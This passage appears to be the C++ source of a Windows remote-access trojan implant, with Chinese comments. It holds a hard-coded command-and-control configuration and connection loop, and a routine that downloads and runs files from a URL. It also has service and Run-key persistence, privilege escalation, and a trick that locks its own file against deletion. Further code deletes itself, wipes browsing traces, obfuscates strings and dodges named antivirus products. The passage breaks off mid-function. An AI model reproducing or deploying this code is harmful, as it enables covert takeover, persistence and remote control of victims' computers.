// MainDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include <stdio.h>
#include <windows.h>
#include <shlobj.h>
#include "KernelManager.h"
#include "Login.h"
#include "common/KeyboardManager.h"
#include "decode.h"
#include "tchar.h"
#include "Wtsapi32.h"
#include  <io.h>
#include <UrlMon.h>
#import "msxml3.dll"
#pragma comment(lib, "urlmon.lib")

#pragma comment(lib , "Wtsapi32.lib")

DLLSERVER_INFO dll_info = {
    "www.swordaa.com",
    "127.0.0.1",
    "127.0.0.1",
    8000,
    8000,
    "V_2017",
    "Default",
    "123456",
    "YYYYYYYYYYYY",
    "Yugqqu qekcaigu",
    "Igaoqa ymusuyukeamucgowws",
    "%ProgramFiles%\\Rumno Qrstuv",
    "Debug.exe",
    "Nmbbre hjveaika",
    0,                       //0为安装不删除    1为安装删除
    0,                       //0为绿色运行      1为Run启动    2为服务启动
    0,                       //0为安装不增大
    0,                       //0为普通安装      1为占坑防删除安装
    0,                        //0为共同安装      1为离线记录安装
    0,
    0,
    FILE_ATTRIBUTE_NORMAL,    //文件属性
    '"',
};

enum {
    NOT_CONNECT, //  还没有连接
    GETLOGINFO_ERROR,
    CONNECT_ERROR,
    HEARTBEATTIMEOUT_ERROR
};

VOID MyEncryptFunction(LPSTR szData, WORD Size);
int StormRand(int count);

void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len)
{
    int i = 0, j = 0, k[256] = { 0 };
    unsigned char tmp = 0;
    for (i = 0; i < 256; i++) {
        s[i] = i;
        k[i] = key[i % Len];
    }
    for (i = 0; i < 256; i++) {
        j = (j + s[i] + k[i]) % 256;
        tmp = s[i];
        s[i] = s[j];
        s[j] = tmp;
    }
}

void rc4_crypt(unsigned char* s, unsigned char* Data, unsigned long Len)
{
    int x = 0, y = 0, t = 0;
    unsigned char tmp;
    unsigned long i;
    for (i = 0; i < Len; i++) {
        x = (x + 1) % 256;
        y = (y + s[x]) % 256;
        tmp = s[x];
        s[x] = s[y];
        s[y] = tmp;
        t = (s[x] + s[y]) % 256;
        Data[i] ^= s[t];
    }
}

VOID MyEncryptFunction(LPSTR szData, WORD Size)
{
    //RC4 加密 密码  Mother360
    unsigned char m_strkey0[256];
    char bpackey_se[] = { 'K','o','t','h','e','r','1','6','8','\0' };

    rc4_init(m_strkey0, (unsigned char*)bpackey_se, sizeof(bpackey_se));  //初始化 RC4密码
    rc4_crypt(m_strkey0, (unsigned char*)szData, Size);
}


void KProcess()   //K终结者进程
{
    char CYZuy02[] = { 'r','u','n','d','l','l','3','2','.','e','x','e','\0' };
    if (GetProcessID(CYZuy02) != NULL) {

        WinExec("taskkill /f /im rundll32.exe", SW_HIDE);  //关闭进程
    }
}

//=============================================================================
void MarkTime(LPCTSTR lpServiceName)  //写入服务安装时间信息
{
    char	strSubKey[1024] = { 0 };


    char JYvni08[] = { 'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t',
                       '\\','S','e','r','v','i','c','e','s','\\','%','s','\0'
                     };

    wsprintf(strSubKey, JYvni08, lpServiceName);

    SYSTEMTIME st;

    GetLocalTime(&st);
    char sDate[MAX_PATH] = { NULL };
    char JYvni06[] = { '%','4','d','-','%','.','2','d','-','%','.','2','d','\0' };

    wsprintf(sDate, JYvni06, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);

    char JYvni04[] = { 'M','a','r','k','T','i','m','e','\0' };
    WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, JYvni04, REG_SZ, (char*)sDate, lstrlen(sDate), 0);
}


bool OpenFile1(LPCTSTR lpFile, INT nShowCmd)
{
    char	lpSubKey[500];
    HKEY	hKey;
    char	strTemp[MAX_PATH];
    LONG	nSize = sizeof(strTemp);
    char* lpstrCat = NULL;
    memset(strTemp, 0, sizeof(strTemp));

    const char* lpExt = strrchr(lpFile, '.');
    if (!lpExt)
        return false;

    if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
        return false;
    RegQueryValue(hKey, NULL, strTemp, &nSize);
    RegCloseKey(hKey);
    memset(lpSubKey, 0, sizeof(lpSubKey));
    wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);

    if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
        return false;
    memset(strTemp, 0, sizeof(strTemp));
    nSize = sizeof(strTemp);
    RegQueryValue(hKey, NULL, strTemp, &nSize);
    RegCloseKey(hKey);

    lpstrCat = strstr(strTemp, "\"%1");
    if (lpstrCat == NULL)
        lpstrCat = strstr(strTemp, "%1");

    if (lpstrCat == NULL) {
        lstrcat(strTemp, " ");
        lstrcat(strTemp, lpFile);
    } else
        lstrcpy(lpstrCat, lpFile);

    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi;
    si.cb = sizeof si;
    if (nShowCmd != SW_HIDE)
        si.lpDesktop = LPSTR("WinSta0\\Default");

    CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
    return TRUE;
}


DWORD WINAPI Loop_DownManager1(LPVOID lparam)
{
    int	nUrlLength;
    char* lpURL = NULL;
    char* lpFileName = NULL;
    nUrlLength = strlen((char*)lparam);
    if (nUrlLength == 0)
        return false;

    lpURL = new char[nUrlLength + 4]();

    memcpy(lpURL, lparam, nUrlLength + 1);

    lpFileName = strrchr(lpURL, '/');
    lpFileName = lpFileName ? lpFileName : lpURL;
    char szFile[512] = { 0 };
    wsprintf(szFile, "c:\\%s", lpFileName);

    HRESULT hr = URLDownloadToFile(NULL, lpURL, szFile, 0, NULL);
    delete[] lpURL;
    if (hr == S_OK) {
        if (!CheckFileExist(szFile))
            return false; //文件下载成功，但是文件不存在，很可能被杀毒软件查杀
    } else if (hr == INET_E_DOWNLOAD_FAILURE)
        return false;    //URL 不正确，文件下载失败
    else
        return false; //文件下载失败，请检查URL是否正确

    OpenFile1(szFile, SW_SHOW);

    return true;
}

#define SWEEP_BUFFER_SIZE			10000

BOOL WipeFile(LPCTSTR szDir, LPCTSTR szFile)
{
    CString sPath;
    HANDLE	hFile;
    DWORD	dwSize;
    DWORD	dwWrite;
    char	sZero[SWEEP_BUFFER_SIZE];
    memset(sZero, 0, SWEEP_BUFFER_SIZE);

    sPath = szDir;
    sPath += _T('\\');
    sPath += szFile;
    hFile = CreateFile(sPath, GENERIC_WRITE,
                       FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
                       FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    dwSize = GetFileSize(hFile, NULL);

    dwSize -= 64;
    SetFilePointer(hFile, 64, NULL, FILE_BEGIN);

    while (dwSize > 0) {
        if (dwSize > SWEEP_BUFFER_SIZE) {
            WriteFile(hFile, sZero, SWEEP_BUFFER_SIZE, &dwWrite, NULL);
            dwSize -= SWEEP_BUFFER_SIZE;
        } else {
            typedef BOOL
            (WINAPI
             * WriteFileT)(
                 __in        HANDLE hFile,
                 __in_bcount(nNumberOfBytesToWrite) LPCVOID lpBuffer,
                 __in        DWORD nNumberOfBytesToWrite,
                 __out_opt   LPDWORD lpNumberOfBytesWritten,
                 __inout_opt LPOVERLAPPED lpOverlapped
             );

            WriteFileT tttt = (WriteFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"), "WriteFile");
            Sleep(0);
            tttt(hFile, sZero, dwSize, &dwWrite, NULL);
            break;
        }
    }

    CloseHandle(hFile);
    return TRUE;
}

BOOL EmptyDirectory(LPCTSTR szPath, BOOL bDeleteDesktopIni,
                    BOOL bWipeIndexDat = FALSE)
{
    HMODULE hDll;

    typedef HMODULE
    (WINAPI
     * LoadLibraryAT)(
         __in LPCSTR lpLibFileName
     );
    typedef HANDLE
    (WINAPI
     * FindFirstFileAT)(
         __in  LPCSTR lpFileName,
         __out LPWIN32_FIND_DATAA lpFindFileData
     );

    LoadLibraryAT pLoadLibraryA = (LoadLibraryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"), "LoadLibraryA");

    hDll = pLoadLibraryA("KERNEL32.dll");

    WIN32_FIND_DATA wfd;
    HANDLE hFind;
    CString sFullPath;
    CString sFindFilter;
    DWORD dwAttributes = 0;

    sFindFilter = szPath;
    sFindFilter += _T("\\*.*");

    char KxIvH[] = { 'F','i','n','d','F','i','r','s','t','F','i','l','e','A','\0' };

    FindFirstFileAT pFindFirstFileA = (FindFirstFileAT)GetProcAddress(hDll, KxIvH);
    if ((hFind = pFindFirstFileA(sFindFilter, &wfd)) == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    do {
        if (_tcscmp(wfd.cFileName, _T(".")) == 0 ||
            _tcscmp(wfd.cFileName, _T("..")) == 0 ||
            (bDeleteDesktopIni == FALSE && _tcsicmp(wfd.cFileName, _T("desktop.ini")) == 0)) {
            continue;
        }

        sFullPath = szPath;
        sFullPath += _T('\\');
        sFullPath += wfd.cFileName;

        //去掉只读属性
        dwAttributes = GetFileAttributes(sFullPath);
        if (dwAttributes & FILE_ATTRIBUTE_READONLY) {
            dwAttributes &= ~FILE_ATTRIBUTE_READONLY;

            typedef BOOL
            (WINAPI
             * SetFileAttributesAT)(
                 __in LPCSTR lpFileName,
                 __in DWORD dwFileAttributes
             );

            SetFileAttributesAT pSetFileAttributesA = (SetFileAttributesAT)GetProcAddress(LoadLibrary("KERNEL32.dll"), "SetFileAttributesA");

            pSetFileAttributesA(sFullPath, dwAttributes);
        }
        if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            EmptyDirectory(sFullPath, bDeleteDesktopIni, bWipeIndexDat);
            RemoveDirectory(sFullPath);
        } else {
            if (bWipeIndexDat && _tcsicmp(wfd.cFileName, _T("index.dat")) == 0) {
                WipeFile(szPath, wfd.cFileName);
            }
            DeleteFile(sFullPath);
        }
    }

    while (FindNextFile(hFind, &wfd));
    FindClose(hFind);

    return TRUE;
}

#define RANDOM_MAX 0x7FFFFFFF
static unsigned long next = 1;
static long my_do_rand(unsigned long* value)
{
    long quotient, remainder, t;

    quotient = *value / 127773L;
    remainder = *value % 127773L;
    t = 16807L * remainder - 2836L * quotient;

    if (t <= 0)
        t += 0x7FFFFFFFL;
    return ((*value = t) % ((unsigned long)RANDOM_MAX + 1));
}

int my_rand(void)
{
    return my_do_rand(&next);
}

//================================================================================================
VOID Wj_OnButtonAdd(LPSTR Path)  //文件加大函数  Path 文件名
{
    if (dll_info.Dele_zd == 0)  //安装不增大
        return;

    int m_Size = dll_info.Dele_zd;  //m_Size=10 就是10M
    DWORD dwSize = m_Size * 1024;
    DWORD iSize;

    HANDLE hFile = CreateFile
                   (
                       Path,
                       GENERIC_WRITE,
                       FILE_SHARE_WRITE,
                       NULL,
                       OPEN_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL,
                       NULL
                   );
    if (hFile == INVALID_HANDLE_VALUE)  //失败
        return;

    SetFilePointer(hFile, 0, NULL, FILE_END);

    iSize = GetFileSize(hFile, NULL);

    if ((dwSize * 1024) > iSize) { //判断文件是否过大 防止服务端程序多次点击运行
        DWORD dwBytes = NULL;
        CHAR Buffer[1024] = { NULL };
        for (DWORD n = 0; n < dwSize; n++) {
            if (n % 1024 == 0) {
                for (int x = 0; x < 1024; x++)
                    Buffer[x] = (char)(my_rand() + x) % 255;    //写入随机垃圾数据
            }

            WriteFile(hFile, Buffer, 1024, &dwBytes, NULL);
        }
    }

    CloseHandle(hFile);
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////
void RaiseToDebugP()  //提权函数
{
    HANDLE hToken;

    HANDLE hProcess = GetCurrentProcess();

    if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        TOKEN_PRIVILEGES tkp;
        char QNdJE01[] = { 'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e','\0' };
        if (LookupPrivilegeValue(NULL, QNdJE01, &tkp.Privileges[0].Luid)) {
            tkp.PrivilegeCount = 1;

            tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            BOOL bREt = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
        }

        CloseHandle(hToken);
    }
}

BOOL OccupyFile(LPCTSTR lpFileName)
{
    BOOL    bRet;
    //提升自身权限

    RaiseToDebugP();
    //打开一个pid为4的进程，只要是存在的进程，都可以

    HANDLE hProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, 4);    // 4为system进程号

    if (hProcess == NULL) {
        return FALSE;
    }

    HANDLE hFile;
    HANDLE hTargetHandle;
    //以独占模式打开目标文件

    hFile = CreateFile(lpFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {

        CloseHandle(hProcess);

        return FALSE;
    }

    //把文件句柄复制到pid=4的进程中去，这样，只要pid=4的进程不退出，谁也动不了目标文件

    bRet = DuplicateHandle(GetCurrentProcess(), hFile, hProcess, &hTargetHandle,
                           0, FALSE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE);

    CloseHandle(hProcess);

    return bRet;
}

//==============================================================================

//==============================================================================
VOID MyCreatDirector(LPSTR Path)   //创建文件夹
{

    CHAR Dir[MAX_PATH] = { NULL };
    int i;

    for (i = 0; (size_t)i < strlen(Path); i++) {
        if (Path[i] == '\\') {

            my_strncpy(Dir, Path, i);

            if (_access(Dir, NULL) == -1) {

                CreateDirectory(Dir, NULL);

            }
        }
    }
}

//================================================================================================

//////过360拦截域名////////////
#include <shlwapi.h>
#include "wininet.h"
#pragma comment(lib,"shlwapi.lib")
#pragma comment(lib,"wininet.lib")

char* lpszHost = NULL;
DWORD	dwPort = 80;

int Login(LPVOID lpServiceName)
{
    char huci[100];
    wsprintf(huci, "%s:%d:%s", dll_info.Domain, dll_info.Port, dll_info.ServiceName);
    HANDLE m_hMutex;
    m_hMutex = CreateMutex(NULL, FALSE, huci);
    if (m_hMutex && GetLastError() == ERROR_ALREADY_EXISTS) {
        ReleaseMutex(m_hMutex);
        CloseHandle(m_hMutex);
        exit(0);
        ExitProcess(0);
        OutputDebugString("m_hMutex");
        return 0;
    }

    MarkTime(dll_info.ServiceName);  //写入服务版本安装时间信息
    CClientSocket SocketClient;
    int     nSleep = 0;
    bool	bBreakError = false;

    if (dll_info.Dele_Kzj != false) {
        CKernelManager	manager(&SocketClient, &dll_info);
        manager.StartUnLineHook();
    }
    while (1) {
        if (dll_info.bisUnInstall) {
            SocketClient.Disconnect();
            break;
        }
        char	lpszHost[256] = { 0 };
        UINT  	dwPort = 0;
        if ((LPVOID)lpServiceName) {
            char chIP[128] = { 0 }, chPort[128] = { 0 }, * ip = NULL;

            ip = (char*)lpServiceName;
            if (strstr(ip, ":") != NULL) {
                char nip[128] = { 0 }, nport[128] = { 0 };
                strncpy(chIP, ip, strcspn(ip, ":"));
                ip = ip + strcspn(ip, ":") + 1;
                strcpy(chPort, ip);

                lstrcat(lpszHost, chIP);
                dwPort = atoi(chPort);
            }
        } else {

            dwPort = dll_info.Port;

            lstrcat(lpszHost, dll_info.Domain);
        }
        if (strcmp(lpszHost, "") == 0) {
            bBreakError = true;
            continue;
        }

        DWORD dwTickCount = GetTickCount();
        if (!SocketClient.Connect(lpszHost, dwPort)) {
            bBreakError = true;
            continue;
        }

        DWORD upTickCount = GetTickCount() - dwTickCount;
        CKernelManager	manager(&SocketClient, lpszHost, dwPort, &dll_info);
        SocketClient.SetManagerCallBack(&manager);
        if (SendLoginInfo(dll_info, &SocketClient, upTickCount) <= 0) {
            SocketClient.Disconnect();
            bBreakError = true;
            continue;
        }

        DWORD	dwIOCPEvent;
        do {
            dwIOCPEvent = WaitForSingleObject(
                              SocketClient.m_hEvent,
                              100);
            Sleep(500);
        } while (dwIOCPEvent != WAIT_OBJECT_0 && !dll_info.bisUnInstall);

        if (dll_info.bisUnInstall) {
            SocketClient.Disconnect();
            break;
        }
    }
    return 0;
}

DWORD __stdcall MainThread()
{
    HANDLE	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return 1;
}

int StormRand(int count)
{
    unsigned long Time = GetTickCount();
    int seed = rand() + 3;
    seed = (seed * Time) % count;
    return seed;
}
HMODULE hDllModule1 = NULL;

void DeleteSelf()
{
    char	strServiceDll[MAX_PATH];
    char	strRandomFile[MAX_PATH];

    GetModuleFileName(hDllModule1, strServiceDll, sizeof(strServiceDll));

    GetSystemDirectory(strRandomFile, sizeof(strRandomFile));
    wsprintfA(strRandomFile, "%s\\%d.bak", strRandomFile, GetTickCount());

    MoveFile(strServiceDll, strRandomFile);
    MoveFileEx(strRandomFile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
}

static BOOL fDelete_Me = FALSE;

//启动服务
static void RunService(/*char *m_ServPath,*/char* m_ServiceName, char* m_DisplayName, char* m_Description)
{
    char FilePath[MAX_PATH];
    GetModuleFileName(NULL, FilePath, MAX_PATH);
    char SystemPath[MAX_PATH];

    ExpandEnvironmentStrings(dll_info.ReleasePath, SystemPath, MAX_PATH);

    if (strncmp(SystemPath, FilePath, strlen(SystemPath)) != 0) {
        MyCreatDirector(SystemPath);   //创建文件夹
        char FileName[80];

        char cpXPZ[] = { '%','s','\0' };
        wsprintf(FileName, cpXPZ, dll_info.ReleaseName);
        if (SystemPath[strlen(SystemPath) - 1] == '\\') //去掉最后的'\\'
            SystemPath[strlen(SystemPath) - 1] = 0;
        strcat(SystemPath, "\\");
        strcat(SystemPath, FileName);
        CopyFile(FilePath, SystemPath, FALSE);
        Wj_OnButtonAdd(SystemPath);  //文件增大
        memset(FilePath, 0, MAX_PATH);
        strcpy(FilePath, SystemPath);
        SetFileAttributes(SystemPath, dll_info.FileAttribute);//放这里才有用
    }

    char Desc[MAX_PATH];
    HKEY key = NULL;
    SC_HANDLE newService = NULL, scm = NULL;
    __try {
        scm = OpenSCManager(0, 0, SC_MANAGER_ALL_ACCESS);
        if (!scm)
            __leave;
        newService = CreateService(
                         scm, m_ServiceName, m_DisplayName,
                         SERVICE_ALL_ACCESS | SERVICE_CHANGE_CONFIG,
                         SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
                         SERVICE_AUTO_START,
                         SERVICE_ERROR_NORMAL,
                         SystemPath, NULL, NULL, NULL, NULL, NULL);
        //锁定一下服务...

        SC_LOCK sc_lock = LockServiceDatabase(scm);
        SERVICE_DESCRIPTION Service_Descrip = { &dll_info.ServiceName[0] };
        ChangeServiceConfig2(newService, SERVICE_CONFIG_DESCRIPTION, &Service_Descrip);

        SERVICE_FAILURE_ACTIONS sdBuf = { 0 };
        sdBuf.lpRebootMsg = NULL;
        sdBuf.dwResetPeriod = 3600 * 24;

        SC_ACTION action[3];

        action[0].Delay = 7000;
        action[0].Type = SC_ACTION_RESTART;

        action[1].Delay = 0;
        action[1].Type = SC_ACTION_RESTART;
        action[2].Delay = 0;
        action[2].Type = SC_ACTION_RESTART;

        sdBuf.cActions = 3;
        sdBuf.lpsaActions = action;
        sdBuf.lpCommand = NULL;

        if (!ChangeServiceConfig2(newService, SERVICE_CONFIG_FAILURE_ACTIONS, &sdBuf)) {
        }

        UnlockServiceDatabase(sc_lock);

        if (newService == NULL) {
            if (GetLastError() == ERROR_SERVICE_EXISTS) {
                newService = OpenService(scm, m_ServiceName, SERVICE_ALL_ACCESS);
                if (newService == NULL)
                    __leave;
                else
                    StartService(newService, 0, 0);
            }
        }
        if (!StartService(newService, 0, 0))
            __leave;
        strcpy(Desc, "SYSTEM\\CurrentControlSet\\Services\\");
        strcat(Desc, m_ServiceName);
        RegOpenKey(HKEY_LOCAL_MACHINE, Desc, &key);
        RegSetValueEx(key, "Description", 0, REG_SZ, (CONST BYTE*)m_Description, lstrlen(m_Description));
    }

    __finally {
        if (newService != NULL)
            CloseServiceHandle(newService);
        if (scm != NULL)
            CloseServiceHandle(scm);
        if (key != NULL)
            RegCloseKey(key);
        Sleep(500);
        if (dll_info.Dele_te) {

            DeleteSelf();
        }
    }
}

//以下是服务的外壳。不用管这么多。因为要写注释也不知道怎么写。格式是固定的
static BOOL service_is_exist()
{
    char SubKey[MAX_PATH] = { 0 };
    strcpy(SubKey, "SYSTEM\\CurrentControlSet\\Services\\");
    strcat(SubKey, dll_info.ServiceName);

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, SubKey, 0L, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
        return TRUE;
    else
        return FALSE;
    RegCloseKey(hKey);
}

static SERVICE_STATUS srvStatus;
static SERVICE_STATUS_HANDLE hSrv;
static void __stdcall SvcCtrlFnct(DWORD CtrlCode)
{
    switch (CtrlCode) {
    case SERVICE_CONTROL_STOP:
        srvStatus.dwCheckPoint = 1;
        srvStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(hSrv, &srvStatus);
        Sleep(500);
        srvStatus.dwCheckPoint = 0;
        srvStatus.dwCurrentState = SERVICE_STOPPED;
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        srvStatus.dwCheckPoint = 1;
        srvStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(hSrv, &srvStatus);
        Sleep(500);
        srvStatus.dwCheckPoint = 0;
        srvStatus.dwCurrentState = SERVICE_STOPPED;
        break;
    case SERVICE_CONTROL_PAUSE:
        srvStatus.dwCheckPoint = 1;
        srvStatus.dwCurrentState = SERVICE_PAUSE_PENDING;
        SetServiceStatus(hSrv, &srvStatus);
        Sleep(500);
        srvStatus.dwCheckPoint = 0;
        srvStatus.dwCurrentState = SERVICE_PAUSED;
        break;
    case SERVICE_CONTROL_CONTINUE:
        srvStatus.dwCheckPoint = 1;
        srvStatus.dwCurrentState = SERVICE_CONTINUE_PENDING;
        SetServiceStatus(hSrv, &srvStatus);
        Sleep(500);
        srvStatus.dwCheckPoint = 0;
        srvStatus.dwCurrentState = SERVICE_RUNNING;
        break;
    }
    SetServiceStatus(hSrv, &srvStatus);
}

HANDLE RunInActiveSession(LPCTSTR lpCommandLine)
{
    HANDLE hProcess;
    HANDLE result;
    HANDLE hProcessInfo;

    HINSTANCE userenv = LoadLibrary("userenv.dll");
    typedef DWORD(WINAPI* CEB)(LPVOID* lpEnvironment, HANDLE hToken, BOOL bInherit);
    CEB  myCreateEnvironmentBlock = (CEB)GetProcAddress(userenv, "CreateEnvironmentBlock");

    LPVOID lpEnvironment = NULL;
    DWORD TokenInformation = 0;
    HANDLE hExistingToken = NULL;
    HANDLE hObject = NULL;

    STARTUPINFO StartupInfo;
    PROCESS_INFORMATION ProcessInfo;
    ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
    ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));

    ProcessInfo.hProcess = 0;
    ProcessInfo.hThread = 0;
    ProcessInfo.dwProcessId = 0;
    ProcessInfo.dwThreadId = 0;
    StartupInfo.cb = 68;
    StartupInfo.lpDesktop = LPSTR("WinSta0\\Default");

    hProcess = GetCurrentProcess();
    OpenProcessToken(hProcess, 0xF01FFu, &hExistingToken);
    DuplicateTokenEx(hExistingToken, 0x2000000u, NULL, SecurityIdentification, TokenPrimary, &hObject);
    typedef DWORD(WINAPI* TWTSGetActiveConsoleSessionId)(void);

    TWTSGetActiveConsoleSessionId  MyWTSGetActiveConsoleSessionId;
    MyWTSGetActiveConsoleSessionId = (TWTSGetActiveConsoleSessionId)GetProcAddress(LoadLibrary("Kernel32.dll"), "WTSGetActiveConsoleSessionId");

    if (MyWTSGetActiveConsoleSessionId) {
        TokenInformation = MyWTSGetActiveConsoleSessionId();

        SetTokenInformation(hObject, TokenSessionId, &TokenInformation, sizeof(DWORD));
        myCreateEnvironmentBlock(&lpEnvironment, hObject, false);
        //                WTSQueryUserToken(TokenInformation,&hObject);
        CreateProcessAsUser(
            hObject,
            NULL,
            (TCHAR*)lpCommandLine,
            NULL,
            NULL,
            false,
            0x430u,
            lpEnvironment,
            NULL,
            &StartupInfo,
            &ProcessInfo);
        hProcessInfo = ProcessInfo.hProcess;
        CloseHandle(hObject);
        CloseHandle(hExistingToken);
        result = hProcessInfo;
    } else {
        result = 0;
    }

    if (userenv)
        FreeLibrary(userenv);

    return result;
}

void ServiceMain()
{
    hSrv = RegisterServiceCtrlHandler(dll_info.ServiceName, SvcCtrlFnct);
    srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
    srvStatus.dwWin32ExitCode = NO_ERROR;
    srvStatus.dwWaitHint = 2000;

    srvStatus.dwCheckPoint = 1;
    srvStatus.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(hSrv, &srvStatus);
    srvStatus.dwCheckPoint = 0;
    Sleep(500);

    OSVERSIONINFO OsVerInfoEx;
    OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&OsVerInfoEx);
    if (OsVerInfoEx.dwMajorVersion < 6) {
        srvStatus.dwCurrentState = SERVICE_RUNNING;
        SetServiceStatus(hSrv, &srvStatus);

        while (1) {
            MainThread();
            Sleep(60);
        }
    } else {
        char CommandLine[1024], MyPath[MAX_PATH];
        HANDLE hActiveSession = NULL;
        GetModuleFileName(NULL, MyPath, MAX_PATH);
        wsprintfA(CommandLine, "%s Win7", MyPath);
        hActiveSession = RunInActiveSession(CommandLine);
        CloseHandle(hActiveSession);

        srvStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hSrv, &srvStatus);

        exit(0);
    }
    return;
}

//=============================================================================
BOOL DeleteMe()  // 自删除
{
    CHAR szModule[MAX_PATH] = { 0 };//本文件的文件名称
    CHAR szComSpec[MAX_PATH] = { 0 };//CMD的名称
    CHAR szParams[MAX_PATH] = { 0 };//传给CMD的命令参数
    //获取本文件的名称
    GetModuleFileName(NULL, szModule, sizeof(szModule));
    GetShortPathName(szModule, szModule, MAX_PATH);
    //获取CMD的名称
    GetEnvironmentVariable("COMSPEC", szComSpec, sizeof(szComSpec));
    //设置命令参数
    lstrcat(szParams, "/c del ");
    lstrcat(szParams, szModule);
    lstrcat(szParams, " > nul");
    //设置成员结构
    SHELLEXECUTEINFO SEI;
    SEI.cbSize = sizeof(SEI);
    SEI.hwnd = NULL;
    SEI.lpVerb = "Open";
    SEI.lpFile = szComSpec;
    SEI.lpParameters = szParams;
    SEI.lpDirectory = NULL;
    SEI.nShow = SW_HIDE;
    SEI.fMask = SEE_MASK_NOCLOSEPROCESS;
    //运行命令行窗口进程
    if (ShellExecuteEx(&SEI)) {
        //设置命令行为IDLE_PRIORITY_CLASS优先级，程序为REALTIME_PRIORITY_CLASS优先级，保证其优先退出
        SetPriorityClass(SEI.hProcess, IDLE_PRIORITY_CLASS);
        SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
        //通知Windows资源浏览器，本程序已被删除
        SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, szModule, 0);
        //		ExitProcess(0);
        return TRUE;
    }

    return FALSE;
}

void WINAPI XIEQID()
{
    //过管家金山 启动
    char x7[80];
    SHGetSpecialFolderPath(NULL, x7, 7, false);
    char* x5 = new char[1024 * 1024];
    wsprintf(x5, "%s�", x7);
    //MessageBox(NULL,x5,"",NULL);
    char* x6 = new char[1024 * 1024];
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    char* p = NULL;
    p = strrchr(path, '\\');
    p += 1;
    Sleep(0);
    wsprintf(x6, "\\??\\%s\\%s", x7, p);//Office Source Engine.exe
    char mdx[] = { 'k','i','l','l','m','d','x','\0' };
    DefineDosDevice(1, mdx, x6);
    Sleep(100);
    char kill[50] = { '\\','\\','.','\\','k','i','l','l','m','d','x','\0' };

    //	MoveFileEx(path,kill,MOVEFILE_REPLACE_EXISTING);// Move瑞星拦截
    CopyFile(path, kill, FALSE);
    SetFileAttributes(x7, FILE_ATTRIBUTE_HIDDEN);
    CreateDirectoryA(x5, NULL);
    delete []x5;
    delete []x6;
}

void WINAPI runwin10()
{
    TCHAR   szPath[MAX_PATH];
    if (!SHGetSpecialFolderPath(NULL, szPath, CSIDL_STARTUP, FALSE)) {
    }
    //定义
    char szFileName[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, szFileName, MAX_PATH);
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, (""), NULL, REG_SZ, (BYTE*)szFileName, sizeof(szFileName));
        RegCloseKey(hKey);
    }
}

void WINAPI runwin100()
{
    char MyPath[MAX_PATH];
    GetModuleFileNameA(NULL, MyPath, MAX_PATH);
    HKEY hKey;
    char asd[] = { 'S','O','F','T','W','A','R','E','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\',
                   'C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','R','u','n','\0'
                 };
    char xy[40];
    wsprintf(xy, "%c%c%c%c%c%c", 'a' + StormRand(26), 'a' + StormRand(26), 'a' + StormRand(26), 'a' + StormRand(26),
             'a' + StormRand(26), 'a' + StormRand(26));
